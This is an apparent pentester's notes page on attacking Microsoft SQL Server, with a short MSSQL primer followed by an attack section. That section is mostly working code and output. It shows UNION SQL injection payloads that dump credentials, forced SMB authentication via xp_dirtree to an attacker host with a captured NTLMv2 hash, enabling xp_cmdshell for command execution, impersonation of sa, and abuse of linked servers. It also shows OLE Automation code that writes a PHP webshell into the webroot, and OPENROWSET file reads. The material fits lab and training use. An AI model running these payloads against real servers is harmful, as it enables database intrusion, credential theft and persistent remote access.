---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# MSSQL (1433)

## 101

### Authentication

| Authentication Type           | Description                                                                                                                                                                                                                                                                                                                                   |
| ----------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Windows authentication mode` | This is **the default**, often referred to as `integrated` security because the SQL Server security model is tightly integrated with Windows/Active Directory. Specific Windows user and group accounts are trusted to log in to SQL Server. Windows users who have already been authenticated do not have to present additional credentials. |
| `Mixed mode`                  | Mixed mode supports authentication by Windows/Active Directory accounts and SQL Server. Username and password pairs are maintained within SQL Server.                                                                                                                                                                                         |

### Schemas

In SQL Server, each table belongs to a specific schema (e.g., `dbo`, `sales`, `hr`, etc.). If you do not specify a schema, SQL Server assumes `dbo` by default.

{% code overflow="wrap" %}
```sql
SELECT * from flags;
// ('42S02', "[42S02] [Microsoft][ODBC Driver 17 for SQL Server][SQL Server]Invalid object name '#flags'. (208) (SQLExecDirectW)")

# Specify the database context explicitly
SELECT * from app.dbo.flags;
```
{% endcode %}

Below are the default MSSQL system schemas:

<table><thead><tr><th width="126" align="right">Schema</th><th>Description</th></tr></thead><tbody><tr><td align="right">master</td><td>Keeps the information for an instance of SQL Server</td></tr><tr><td align="right">msdb</td><td>Used by SQL Server Agent</td></tr><tr><td align="right">model</td><td>Template database copied for each new database</td></tr><tr><td align="right">resource</td><td>Read-only, keeps sys objects visible in every server database in sys schema</td></tr><tr><td align="right">tempdb</td><td>Keeps temporary objects for SQL queries</td></tr></tbody></table>

### Users

`sa` is the default administrator-level account in MSSQL.

### Syntax

{% tabs %}
{% tab title="Version" %}
```sql
SELECT @@version;
```
{% endtab %}

{% tab title="Current User" %}
```sql
SELECT system_user;
```
{% endtab %}

{% tab title="Databases" %}
```sql
SELECT name FROM sys.databases;
USE <database>;
```
{% endtab %}

{% tab title="Tables" %}
```sql
SELECT * FROM <database>.information_schema.tables;
```
{% endtab %}

{% tab title="Columns" %}
{% code overflow="wrap" %}
```sql
SELECT column_name, data_type FROM <database>.information_schema.columns WHERE table_name = '<tableName>';
```
{% endcode %}
{% endtab %}
{% endtabs %}

{% hint style="warning" %}
When querying from a CLI tool, a SQL statement must be submitted ending with `;` followed by a `GO` on a separate line.
{% endhint %}

### CLI Tools

{% tabs %}
{% tab title="Linux" %}
Alternative to `sqlcmd` for Linux (`-h` disables headers & footers for a cleaner output):

```bash
sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
```

If we define the domain or hostname, it will use **Windows authentication**. If we don't, it will assume **SQL Authentication** and authenticate against the users created in the SQL server.

```bash
# Authenticating with a local account
sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
```

Impacket script:

```
impacket-mssqlclient <domain>/<user>:<pass>@<target> -windows-auth
```
{% endtab %}

{% tab title="Windows" %}
Native Windows tool:

```sh
sqlcmd -U <username> -P '<password>' -Q '<query1;query2;>' 
```

We can use the params `-y` (`SQLCMDMAXVARTYPEWIDTH`) and `-Y` (`SQLCMDMAXFIXEDTYPEWIDTH`) for better looking output (may affect performance):

```shell
sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
```

If we use `sqlcmd`, we will need to use `GO` after our query to execute the SQL syntax:

```sql
# List existing databases
1> SELECT name FROM master.dbo.sysdatabases
2> GO

# Select database
1> USE htbusers
2> GO

# List tables
1> SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
2> GO

# Dump data
1> SELECT * FROM users
2> GO
```
{% endtab %}
{% endtabs %}

## Attacks

### SQLi

{% tabs %}
{% tab title="Col Num" %}
```bash
q=anger' ORDER BY 1;--
q=anger' UNION SELECT NULL;--
q=anger' UNION SELECT 1;--
```
{% endtab %}

{% tab title="Char Col" %}
```bash
q=anger1' UNION SELECT 'a',2,3,4,5,6;-- -
```
{% endtab %}

{% tab title="LAN Stacked" %}
{% code overflow="wrap" %}
```bash
# check connection back with nc on port 445, and then responder
q=anger1'; exec dir_tree '\\<attack-ip>\\sharename\file'--
```
{% endcode %}
{% endtab %}

{% tab title="LAN Stacked (2)" %}
{% code overflow="wrap" %}
```bash
# first connection
sudo nc -lvnp 445
listening on [any] 445 ...
connect to [10.10.14.121] from (UNKNOWN) [10.10.11.158] 50883
E�SMBrS�����"NT LM 0.12SMB 2.002SMB 2.???^C
# second connection
sudo responder -I tun0
<SNIP>
[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.11.158
[SMB] NTLMv2-SSP Username : streamIO\DC$
[SMB] NTLMv2-SSP Hash     : DC$::streamIO:c45d729b18399cdd:DC47BA38B0757F30605D68A6D5B969FE:0101000000000000803B7DFBB994DA011011EEA196276E730000000002000800410043004F00410001001E00570049004E002D005500500046004200320059003900580030005400520004003400570049004E002D00550050004600420032005900390058003000540052002E00410043004F0041002E004C004F00430041004C0003001400410043004F0041002E004C004F00430041004C0005001400410043004F0041002E004C004F00430041004C0007000800803B7DFBB994DA0106000400020000000800300030000000000000000000000000300000EC58810B0121088E8266094DE4E2D0B2340D33D1D6BE1317A3BA66F26DE4CFBE0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100320031000000000000000000
```
{% endcode %}
{% endtab %}

{% tab title="Wildcards" %}
```bash
# wildcards in MSSQL
SELECT * FROM movies WHERE name LIKE '%anger%';
SELECT * FROM movies WHERE CONTAINS (name,'*500*');
```
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="Version" %}
```bash
q=anger1' UNION SELECT 1,@@version,3,4,5,6;--
```
{% endtab %}

{% tab title="DBs" %}
```bash
q=anger1' UNION SELECT 1,name,3,4,5,6 FROM master..sysdatabases--
q=anger1' UNION SELECT 1,name,3,4,5,6 FROM sys.databases--
```
{% endtab %}

{% tab title="Tables" %}
{% code overflow="wrap" %}
```bash
q=anger1' UNION SELECT 1,CONCAT(name,':',id),3,4,5,6 FROM streamio..sysobjects--
```
{% endcode %}
{% endtab %}

{% tab title="Cols" %}
{% code overflow="wrap" %}
```bash
q=anger1' UNION SELECT 1,name,3,4,5,6 FROM streamio..syscolumns WHERE id=901578250--
```
{% endcode %}
{% endtab %}

{% tab title="Data" %}
{% code overflow="wrap" %}
```bash
q=anger1' UNION SELECT 1,(SELECT STRING_AGG(CONCAT(username,':',password),'|') FROM users),3,4,5,6--
```
{% endcode %}
{% endtab %}
{% endtabs %}

### RCE

{% hint style="success" %}
RCE via `xp_cmdshell` can also be achieved via [`nxc mssql`](../../../../tools/active-directory/netexec-cme.md#mssql).
{% endhint %}

In MSSQL, the `xp_cmdshell` function allows <mark style="background-color:yellow;">execution of system commands</mark> from SQL by passing a string to the command shell and returning the output as text rows. It operates synchronously—control returns only after the command completes—and runs with the <mark style="background-color:yellow;">same permissions as the SQL Server service account</mark>. Due to its power and potential for abuse, `xp_cmdshell` is <mark style="background-color:yellow;">disabled by default</mark> and can be enabled or disabled using Policy-Based Management or the `sp_configure` command. Functions like this, which can lead to remote code execution (RCE), are typically restricted to privileged users, and exploiting them via a SQL injection (SQLi) vulnerability usually requires the use of stacked queries.

{% hint style="warning" %}
The Linux version of MSSQL does not support `xp_cmdshell`.
{% endhint %}

```sql
# Allow advanced options to be modified
EXECUTE sp_configure 'show advanced options', 1;  
GO
# Update currently configured value for advanced options
RECONFIGURE;  
GO 
# Enable the feature
EXECUTE sp_configure 'xp_cmdshell', 1;  
GO 
# Update the currently configured value for this feature
RECONFIGURE;  
GO
# Use feature
EXECUTE xp_cmdshell '<system-command>';
```

### Hash Capture

In MSSQL, it's possible to capture the SQL Server service account's NTLMv2 hash using the undocumented stored procedures `xp_dirtree` or `xp_subdirs`, which leverage the SMB protocol to list directories. By pointing one of these procedures to an attacker-controlled SMB server, the server running SQL Server is tricked into authenticating and sends its NTLMv2 hash. To perform this, tools like `responder` or `impacket-smbserver` must be started first, followed by executing a crafted query that triggers the SMB request.

{% code overflow="wrap" %}
```sql
# xp_dirtree
1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
2> GO

subdirectory    depth
--------------- -----------

# xp_subdirs
1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
2> GO

HResult 0x55F6, Level 16, State 1
xp_subdirs could not access '\\10.10.110.17\share\*.*': FindFirstFile() returned error 5, 'Access is denied.'
```
{% endcode %}

If the service account has access to our server, we will obtain its hash:

{% code overflow="wrap" %}
```shell
# Capture the hash with responder
$ sudo responder -I tun0
...
[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.110.17
[SMB] NTLMv2-SSP Username : SRVMSSQL\demouser
[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:5e3...000

# Capture the hash with Impacket
# hash stealing with impacket
$ sudo impacket-smbserver share ./ -smb2support
...                     
[*] demouser::WIN7BOX:5e3...000
```
{% endcode %}

We can then attempt to crack it or relay it to another host.

### User Impersonation

SQL Server includes a special permission called `IMPERSONATE`, which allows a user to assume the permissions of another user or login until the session ends or the context is reset. While sysadmins can impersonate any user by default, non-admin users require explicit permission to do so. To identify which users can be impersonated, a specific query can be run to check assigned impersonation rights:

```sql
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO

name
-----------------------------------------------
sa
ben
valentin

(3 rows affected)
```

To get an idea of privilege escalation possibilities, let's verify if our current user has the `sysadmin` role:

{% code overflow="wrap" %}
```sql
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go

-----------
julio                                                                                                                    

(1 rows affected)

-----------
          0

(1 rows affected)
```
{% endcode %}

As the return value `0` indicates, we do not have the `sysadmin` role, but we can impersonate the `sa` user. To impersonate a user, we can use the Transact-SQL statement `EXECUTE AS LOGIN` and set it to the user we want to impersonate:

{% hint style="info" %}
It is recommended to run `EXECUTE AS LOGIN` within the master database (`USE master`), because all users, by default, have access to that database. If a user you are trying to impersonate does not have access to the database you are connecting to it will result in an error.
{% endhint %}

```sql
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO

-----------
sa

(1 rows affected)

-----------
          1

(1 rows affected)
```

We can now execute any command as a `sysadmin`. To revert the operation and return to our previous user, we can use the Transact-SQL statement `REVERT`.

> If we find a user who is not `sysadmin`, we can still check if the user has access to other databases or linked servers.

### Linked Servers

MSSQL supports a configuration option called [**linked servers**](https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/create-linked-servers-sql-server-database-engine), which <mark style="background-color:yellow;">allows the database engine to run Transact-SQL queries across different SQL Server instances</mark> or even other database systems like Oracle. If an attacker gains access to a SQL Server with linked servers configured, this can potentially be <mark style="background-color:yellow;">used for lateral movement</mark>. Admins may configure linked servers using credentials from the remote server, and if those credentials have `sysadmin` privileges, it may be possible to execute commands on the remote SQL instance.

```sql
# Identify linked servers
1> SELECT srvname, isremote FROM sysservers
2> GO

srvname                             isremote
----------------------------------- --------
DESKTOP-MFERMN4\SQLEXPRESS          1
10.0.0.12\SQLEXPRESS                0

(2 rows affected)
```

We have the name of the server and the column `isremote`, where `1` means is a remote server, and `0` is a linked server.

Next, we can attempt to identify the user used for the connection and its privileges. The `EXECUTE` statement can be used to send pass-through commands to linked servers. We add our command between parenthesis and specify the linked server between square brackets:

{% code overflow="wrap" %}
```sql
# identify user and its privs
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2> GO

------------------------------ ------------------------------ ------------------------------ -----------
DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote                                1

(1 rows affected)
```
{% endcode %}

> If we need to use quotes in our query to the linked server, we need to use single double quotes to escape the single quote. To run multiple commands at once we can divide them up with a `;`.

We can now execute queries with `sysadmin` rights on the linked server. We can read data from any database or execute system commands with `xp_cmdshell`.

### Write Files

To write file in MSSQL, we need to enable [Ole Automation Procedures](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option), which requires admin rights, and then execute some stored procedures to create the file:

{% code overflow="wrap" %}
```sql
# Enable Ole Automation Procedures
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO

# Create a file
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```
{% endcode %}

### Read Files

By default, MSSQL allows file read on any file in the OS to which the account has read access:

{% code overflow="wrap" %}
```sql
# Read local file
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO
```
{% endcode %}

## To Be Added

[https://github.com/quentinhardy/msdat](https://github.com/quentinhardy/msdat)

## Resources

{% tabs %}
{% tab title="sqlcmd" %}
{% embed url="https://learn.microsoft.com/en-us/sql/tools/sqlcmd/sqlcmd-use-utility?view=sql-server-ver16" %}
{% endtab %}

{% tab title="sqsh" %}
{% embed url="https://vonloxley.github.io/sqsh/" %}
{% endtab %}

{% tab title="Impacket" %}
{% embed url="https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py" %}
{% endtab %}
{% endtabs %}
